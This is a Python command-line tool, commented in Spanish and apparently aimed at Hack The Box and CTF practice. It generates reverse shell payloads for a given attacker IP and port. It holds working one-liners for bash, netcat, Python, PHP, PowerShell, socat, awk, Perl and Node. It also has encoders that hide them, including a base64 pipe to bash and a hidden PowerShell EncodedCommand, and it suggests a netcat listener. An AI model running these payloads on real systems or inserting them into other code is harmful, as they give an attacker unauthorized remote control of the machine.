#!/usr/bin/env python3
"""
Generador de Payloads de Reverse Shell
Soporta múltiples lenguajes, entornos y codificaciones (Plano, Base64, URL-encode).
"""

import argparse
import base64
import urllib.parse
import sys

# Definición de templates de Reverse Shell
SHELL_TEMPLATES = {
    "bash": {
        "desc": "Bash TCP estándar",
        "cmd": "bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    },
    "bash_read": {
        "desc": "Bash interactiva con descriptor de lectura",
        "cmd": "0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196"
    },
    "bash_5": {
        "desc": "Bash exec descriptor 5",
        "cmd": "exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done"
    },
    "nc_mkfifo": {
        "desc": "Netcat tradicional con mkfifo",
        "cmd": "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f"
    },
    "nc_e": {
        "desc": "Netcat con flag -e",
        "cmd": "nc -e /bin/sh {ip} {port}"
    },
    "nc_c": {
        "desc": "Netcat con flag -c",
        "cmd": "nc -c /bin/sh {ip} {port}"
    },
    "python3": {
        "desc": "Python 3 con socket y subprocess",
        "cmd": 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")\''
    },
    "php_exec": {
        "desc": "PHP exec básico",
        "cmd": 'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\''
    },
    "php_proc": {
        "desc": "PHP proc_open interactivo",
        "cmd": 'php -r \'$sock=fsockopen("{ip}",{port});$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);\''
    },
    "powershell": {
        "desc": "PowerShell TCP Client (Windows)",
        "cmd": "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
    },
    "socat": {
        "desc": "Socat TTY (Full interactivo)",
        "cmd": "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}"
    },
    "awk": {
        "desc": "AWK TCP",
        "cmd": 'awk \'BEGIN {{s = "/inet/tcp/0/{ip}/{port}"; while(42) {{ do{{ printf "shell>" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c!="exit") close(s); }}}}\' /dev/null'
    },
    "perl": {
        "desc": "Perl TCP",
        "cmd": 'perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\''
    },
    "node": {
        "desc": "NodeJS",
        "cmd": '(function(){{ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect({port}, "{ip}", function(){{ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }}); return /a/; }})();'
    }
}


def encode_payload(raw_cmd: str, encoding: str) -> str:
    """Aplica la codificación solicitada al payload."""
    if encoding == "base64":
        encoded = base64.b64encode(raw_cmd.encode()).decode()
        return f"echo {encoded} | base64 -d | bash"
    elif encoding == "base64-raw":
        return base64.b64encode(raw_cmd.encode()).decode()
    elif encoding == "url":
        return urllib.parse.quote_plus(raw_cmd)
    elif encoding == "powershell-b64":
        # PowerShell espera UTF-16LE para comandos codificados (-EncodedCommand)
        utf16_bytes = raw_cmd.encode('utf-16le')
        b64 = base64.b64encode(utf16_bytes).decode()
        return f"powershell -nop -w hidden -EncodedCommand {b64}"
    return raw_cmd


def banner():
    print("""
=======================================================
 [*] GENERADOR DE REVERSE SHELLS (HTB & CTF Tool)
=======================================================
""")


def list_payloads():
    print("[+] Payloads disponibles:\n")
    for key, info in SHELL_TEMPLATES.items():
        print(f"  • {key:<14} : {info['desc']}")
    print("\n[+] Codificaciones (--encode):")
    print("  • raw            : Sin codificar (default)")
    print("  • base64         : 'echo <b64> | base64 -d | bash'")
    print("  • base64-raw     : Cadena en Base64 pura")
    print("  • url            : URL-encoded (para web/GET/POST parameters)")
    print("  • powershell-b64 : 'powershell -EncodedCommand <UTF16-LE b64>'")
    print("=======================================================")


def main():
    parser = argparse.ArgumentParser(
        description="Generador rápido de Reverse Shells personalizadas y codificadas.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="Ejemplos:\n"
               "  python3 revshell_gen.py 10.10.14.5 4444\n"
               "  python3 revshell_gen.py 10.10.14.5 4444 -t python3\n"
               "  python3 revshell_gen.py 10.10.14.5 4444 -t bash -e url\n"
               "  python3 revshell_gen.py 10.10.14.5 4444 -t powershell -e powershell-b64\n"
    )

    parser.add_argument("ip", nargs="?", help="IP del atacante (LHOST / tun0)")
    parser.add_argument("port", nargs="?", type=int, help="Puerto del atacante (LPORT)")
    parser.add_argument("-t", "--type", default="all", choices=list(SHELL_TEMPLATES.keys()) + ["all"],
                        help="Tipo de shell a generar (default: all)")
    parser.add_argument("-e", "--encode", default="raw",
                        choices=["raw", "base64", "base64-raw", "url", "powershell-b64"],
                        help="Tipo de codificación a aplicar (default: raw)")
    parser.add_argument("-l", "--list", action="store_true", help="Listar todos los tipos de payloads soportados")

    args = parser.parse_args()

    if args.list:
        banner()
        list_payloads()
        return

    if not args.ip or not args.port:
        banner()
        parser.print_help()
        print("\n[!] Error: Debes especificar al menos la IP y el PUERTO.")
        sys.exit(1)

    banner()
    print(f"[*] LHOST: {args.ip}")
    print(f"[*] LPORT: {args.port}")
    print(f"[*] Encoding: {args.encode}")
    print(f"[*] Listener sugerido: nc -lvnp {args.port}")
    print("=" * 55 + "\n")

    selected_types = [args.type] if args.type != "all" else list(SHELL_TEMPLATES.keys())

    for shell_type in selected_types:
        info = SHELL_TEMPLATES[shell_type]
        raw_cmd = info["cmd"].format(ip=args.ip, port=args.port)
        final_cmd = encode_payload(raw_cmd, args.encode)

        print(f"[+] [{shell_type.upper()}] - {info['desc']}")
        print(f"{final_cmd}\n")

    print("=" * 55)


if __name__ == "__main__":
    main()
